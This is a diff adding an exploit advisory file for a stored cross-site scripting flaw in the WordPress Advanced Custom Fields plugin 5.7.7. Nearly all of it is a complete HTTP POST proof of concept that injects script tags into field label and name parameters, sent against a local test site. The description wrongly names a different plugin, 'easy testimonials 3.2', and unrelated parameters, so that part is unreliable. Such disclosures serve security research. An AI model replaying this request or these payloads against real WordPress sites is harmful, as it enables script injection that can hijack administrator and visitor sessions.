@@ -1,0 +1,33 @@
+# Exploit Title: Wordpress Plugins Advanced-custom-fields 5.7.7 - Cross-Site Scripting
+# Google Dork: N/A
+# Date: 2018-12-02
+# Exploit Author: Loading Kura Kura
+# Vendor Homepage: https://www.advancedcustomfields.com/]
+# Software Link: https://www.advancedcustomfields.com/
+# Version: 5.7.7
+# Tested on: Win10 x64/Kali linux x64
+# CVE : N/A
+
+# description:
+# A Stored Cross-site scripting (XSS) was discovered in wordpress plugins easy testimonials 3.2.
+# Three parameters(_ikcf_client _ikcf_position _ikcf_other) have Cross-Site Scripting.
+
+# Paramater: acf_fields[11][label]
+# PoC 
+
+POST /wordpress/wp-admin/post.php HTTP/1.1
+Host: localhost
+Content-Length: 2838
+Cache-Control: max-age=0
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost/wordpress/wp-admin/post.php?post=8&action=edit
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6
+Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1543850245%7CLBSY8ANOj9TKCX2YpnzKJoZ5N75oRW4ZGkZZrw5INPt%7C74dd4284fad8e2f658d13db3d669d0d61976654b4b9e7b4a820b0156fb018264; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1543850245%7CLBSY8ANOj9TKCX2YpnzKJoZ5N75oRW4ZGkZZrw5INPt%7Cd0b0455678fae203a81b5c23b42dbfa51b0ab665e33607d2b09b1d5d62cc36be; wp-settings-time-1=1543678278; wp-settings-1=mfold%3Do; hblid=gR3SowbFiR0QuMDg3m39N0I6Bo2jr38A; olfsk=olfsk8076045099904943; _gcl_au=1.1.201976856.1543314650
+Connection: close
+
+_wpnonce=415211ddca&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D8%26action%3Dedit%26message%3D1&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=acf-field-group&original_post_status=publish&referredby=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D8%26action%3Dedit&_wp_original_http_referer=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D8%26action%3Dedit&post_ID=8&meta-box-order-nonce=2cc12cc441&closedpostboxesnonce=bbd0be706b&post_title=xss&samplepermalinknonce=4f1f2ec280&_acf_screen=field_group&_acf_post_id=8&_acf_nonce=191e753914&_acf_validation=0&_acf_changed=1&_acf_delete_fields=0%7C9&original_publish=Update&save=Update&acf_fields%5B11%5D%5BID%5D=11&acf_fields%5B11%5D%5Bkey%5D=field_5c02a79cc0f83&acf_fields%5B11%5D%5Bparent%5D=8&acf_fields%5B11%5D%5Bmenu_order%5D=0&acf_fields%5B11%5D%5Bsave%5D=settings&acf_fields[11][label]=%3Cscript%3Ealert%28%22loadingkurakura%22%29%3C%2Fscript%3E&acf_fields%5B11%5D%5Bname%5D=%3Cscript%3Ealert%28%22loadingkurakura1%22%29%3C%2Fscript%3E&acf_fields%5B11%5D%5Btype%5D=text&acf_fields%5B11%5D%5Binstructions%5D=&acf_fields%5B11%5D%5Brequired%5D=0&acf_fields%5B11%5D%5Brequired%5D=1&acf_fields%5B11%5D%5Bdefault_value%5D=&acf_fields%5B11%5D%5Bplaceholder%5D=&acf_fields%5B11%5D%5Bprepend%5D=&acf_fields%5B11%5D%5Bappend%5D=&acf_fields%5B11%5D%5Bmaxlength%5D=&acf_fields%5B11%5D%5Bconditional_logic%5D=0&acf_fields%5B11%5D%5Bwrapper%5D%5Bwidth%5D=&acf_fields%5B11%5D%5Bwrapper%5D%5Bclass%5D=&acf_fields%5B11%5D%5Bwrapper%5D%5Bid%5D=&acf_fields%5B10%5D%5BID%5D=10&acf_fields%5B10%5D%5Bkey%5D=field_5c02a7abc0f84&acf_fields%5B10%5D%5Bparent%5D=8&acf_fields%5B10%5D%5Bmenu_order%5D=1&acf_fields%5B10%5D%5Bsave%5D=meta&acf_fields%5B12%5D%5BID%5D=12&acf_fields%5B12%5D%5Bkey%5D=field_5c02a7abc0f84&acf_fields%5B12%5D%5Bparent%5D=8&acf_fields%5B12%5D%5Bmenu_order%5D=2&acf_fields%5B12%5D%5Bsave%5D=meta&acf_field_group%5Blocation%5D%5Bgroup_0%5D%5Brule_0%5D%5Bparam%5D=post_type&acf_field_group%5Blocation%5D%5Bgroup_0%5D%5Brule_0%5D%5Boperator%5D=%3D%3D&acf_field_group%5Blocation%5D%5Bgroup_0%5D%5Brule_0%5D%5Bvalue%5D=post&acf_field_group%5Blocation%5D%5Bgroup_0%5D%5Brule_1%5D%5Bparam%5D=post_type&acf_field_group%5Blocation%5D%5Bgroup_0%5D%5Brule_1%5D%5Boperator%5D=%3D%3D&acf_field_group%5Blocation%5D%5Bgroup_0%5D%5Brule_1%5D%5Bvalue%5D=post&acf_field_group%5Bactive%5D=0&acf_field_group%5Bactive%5D=1&acf_field_group%5Bstyle%5D=default&acf_field_group%5Bposition%5D=normal&acf_field_group%5Blabel_placement%5D=top&acf_field_group%5Binstruction_placement%5D=label&acf_field_group%5Bmenu_order%5D=0&acf_field_group%5Bdescription%5D=ddd&acf_field_group%5Bhide_on_screen%5D=&acf_field_group%5Bhide_on_screen%5D%5B%5D=the_content&acf_field_group%5Bkey%5D=group_5c02a6cfa31d6&post_name=group_5c02a6cfa31d6
